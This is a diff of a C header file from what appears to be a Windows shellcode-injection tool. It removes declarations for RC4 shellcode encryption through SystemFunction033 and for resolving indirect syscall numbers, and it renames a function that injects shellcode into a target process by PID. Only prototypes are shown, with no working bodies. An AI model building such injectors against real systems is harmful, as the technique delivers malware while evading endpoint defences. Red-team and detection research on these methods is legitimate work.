@@ -156,31 +156,8 @@ extern NTSTATUS NtClose(
     IN HANDLE Handle
 );
 
-
-typedef NTSTATUS(WINAPI* _SystemFunction033)(
-    struct ustring* memoryRegion,
-    struct ustring* keyPointer);
-
-struct ustring {
-    DWORD Length;
-    DWORD MaximumLength;
-    PUCHAR Buffer;
-} data, key;
-
-
-BOOL EncryptRC4(
-    _In_ CONST PBYTE pShellcode,
-    _In_ CONST SIZE_T sSizeofShellcode
-);
-
-
-VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys);
-
-
-
-BOOL NtShellInjection(
+BOOL IndirectShellInjection(
     _In_ CONST DWORD PID,
-    CONST PBYTE pEncryptedShellcode,
     _In_ CONST PBYTE pShellcode,
     _In_ CONST SIZE_T sSizeofShellcode
 );
